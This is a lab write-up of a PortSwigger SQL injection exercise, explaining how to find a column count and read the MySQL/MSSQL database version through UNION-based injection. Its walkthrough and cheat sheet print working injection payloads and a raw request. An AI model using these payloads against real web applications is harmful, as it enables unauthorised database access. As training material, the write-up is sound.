# SQL Injection - Lab #8: SQLi attack, querying the database type and version on MySQL & Microsoft

**YouTube Tutorial:** [SQL Injection - Lab #8 SQLi attack, querying the database type and version on MySQL & Microsoft](https://www.youtube.com/watch?v=MFTk_LNRW0g)

---

## 1. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Core Concept:** A SQL injection vulnerability exists in the product category filter (`category`). The application executes user input directly into an SQL query and displays the query results directly on the webpage.
* **Vulnerability Behavior:** Since the application displays data returned from the query, an attacker can use a `UNION`-based SQL injection to append an injected `SELECT` statement and extract system information like the database version string.

### Root Cause & Impact

* **Root Cause:** Dynamic query construction via unsafe string concatenation in the backend application code.
* **Database-Specific Behavior (MySQL & Microsoft SQL Server):**
1. Both MySQL and Microsoft SQL Server allow accessing database version information using the system variable `@@version`.
2. Unlike Oracle, queries in MySQL and Microsoft SQL Server do **not** strictly require a `FROM` clause for literal values or variables.
3. **Comment Syntax Differences:** MySQL requires either a `#` symbol or a `-- ` (double dash followed by a space) to inline-comment out the remainder of a SQL query. A raw `--` without trailing whitespace or improper URL encoding causes a syntax error.


* **Goal:** Determine column count and string data type support, identify comment syntax, and retrieve the database version string using `@@version`.

---

## 2. Attack Methods & Techniques

### Method Details

* **Phase 1 (Comment Syntax & Column Count Testing):** Test query truncation using `#` (URL encoded as `%23`) alongside `ORDER BY N%23` to find the exact number of query columns.
* **Phase 2 (String Data Type Support Verification):** Test `UNION SELECT 'a', 'a'%23` to confirm both columns accept text string values without returning a type mismatch error.
* **Phase 3 (Version Extraction):** Inject `@@version` using `UNION SELECT @@version, NULL%23` to output the database engine type and version.

### Server Behavior

* **Unencoded / Invalid Comment Operator (`--` without space):** Causes a SQL syntax error, leading the application to return an **HTTP 500 Internal Server Error**.
* **Valid Comment Operator (`#` or `%23`):** Truncates the rest of the backend query correctly, returning an **HTTP 200 OK** response.
* **Successful Version Query:** The application renders the database version string (e.g., `8.0.23` for MySQL) directly into the HTML response body.

---

## 3. Attack Flowchart

```
+-------------------------------------------------------+
|  Step 1: Intercept Product Filter Request (category)  |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 2: Determine Comment Character & Column Count   |
|  • ORDER BY 1--   -> HTTP 500 (Invalid syntax)        |
|  • ORDER BY 1#    -> HTTP 200 OK                      |
|  • ORDER BY 2#    -> HTTP 200 OK                      |
|  • ORDER BY 3#    -> HTTP 500 Error                   |
|  Result: Total = 2 Columns (Use '#' or '-- ')         |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 3: Verify Column Data Types                     |
|  • UNION SELECT 'a', 'a'#                             |
|    -> HTTP 200 OK (Both columns accept strings)       |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 4: Query System Version Variable                |
|  UNION SELECT @@version, NULL#                        |
|  -> HTTP 200 OK (Version string rendered on page)     |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 5: Lab Solved Successfully                      |
+-------------------------------------------------------+

```

---

## 4. UML Sequence Diagram

```
Browser / User          Burp Suite Proxy          Web Application               Database (MySQL / MSSQL)
      |                         |                        |                         |
      |-- 1. GET /filter?cat=Gifts' ORDER BY 1-- ------>|                         |
      |                         |                        |-- 2. Execute SQL ------>|
      |                         |                        |<-- 3. Syntax Error -----|
      |<-- 4. HTTP 500 Error ---|<-- 5. Return 500 -------|                         |
      |                         |                        |                         |
      |-- 6. GET /filter?cat=Gifts' ORDER BY 3%23 ----->|                         |
      |                         |                        |-- 7. Execute SQL ------>|
      |                         |                        |<-- 8. Unknown Column ---|
      |<-- 9. HTTP 500 Error ---|<-- 10. Return 500 ------|                         |
      |                         |                        |                         |
      |== 11. Column count confirmed = 2 columns ==================================|
      |                         |                        |                         |
      |-- 12. GET /filter?cat=Gifts' UNION SELECT 'a','a'%23 --------------------->|
      |                         |                        |-- 13. Execute SQL ----->|
      |                         |                        |<-- 14. Valid Response --|
      |<-- 15. HTTP 200 OK -----|<-- 16. Render 'a' ------|                         |
      |                         |                        |                         |
      |-- 17. GET /filter?cat=Gifts' UNION SELECT @@version, NULL%23 ------------->|
      |                         |                        |-- 18. Read @@version ->|
      |                         |                        |<-- 19. Version String --|
      |<-- 20. Lab Solved! -----|<-- 21. HTTP 200 OK -----|                         |

```

---

## 5. Step-by-Step Walkthrough

### Step 1: Identify Comment Character & Column Count

1. Standard SQL comments `--` fail if not followed by a space:
* `GET /filter?category=Gifts'+ORDER+BY+1--` $\rightarrow$ **HTTP 500 Internal Server Error**


2. Replace `--` with URL-encoded `#` (`%23`) or `--+`:
* `GET /filter?category=Gifts'+ORDER+BY+1%23` $\rightarrow$ **HTTP 200 OK**
* `GET /filter?category=Gifts'+ORDER+BY+2%23` $\rightarrow$ **HTTP 200 OK**
* `GET /filter?category=Gifts'+ORDER+BY+3%23` $\rightarrow$ **HTTP 500 Internal Server Error**


3. **Result:** Query uses **2 columns**.

### Step 2: Confirm String Column Data Types

Inject string literals into both column positions using the valid comment symbol:

* **Payload:** `Gifts' UNION SELECT 'a', 'a'#`
* **Raw URL Path:** `/filter?category=Gifts%27+UNION+SELECT+%27a%27%2C+%27a%27%23`
* **Result:** Returns **HTTP 200 OK** and displays `a` on the page for both product fields.

### Step 3: Extract Database Version

Use the SQL system variable `@@version` in position 1 and `NULL` in position 2:

* **Payload:**
```sql
Gifts' UNION SELECT @@version, NULL#

```


* **Raw Request:**
```http
GET /filter?category=Gifts%27+UNION+SELECT+%40%40version%2C+NULL%23 HTTP/1.1
Host: [LAB-ID].web-security-academy.net

```


* **Response:** **HTTP 200 OK** $\rightarrow$ Renders the version output (e.g., `8.0.23`) on the page, completing the lab challenge.

---

## 6. Pro-Tips & Common Pitfalls

* **MySQL Comment Whitespace Trap:** In MySQL, `--` **must** be followed by a space (or a control character like newline/tab). In HTTP requests, an unencoded space turns into `+` or `%20`. If passed as `--`, MySQL will throw a syntax error. Using `#` (`%23`) avoids this issue entirely.
* **Cross-Database Version Cheat Sheet:**
* **MySQL / Microsoft SQL Server:** `@@version`
* **PostgreSQL:** `version()`
* **Oracle:** `banner` from `v$version`


* **URL Encoding Hash Signs:** Always encode `#` as `%23` when submitting HTTP GET requests, otherwise browsers and web servers treat `#` as an inline URL fragment identifier and strip it from the request body sent to the server.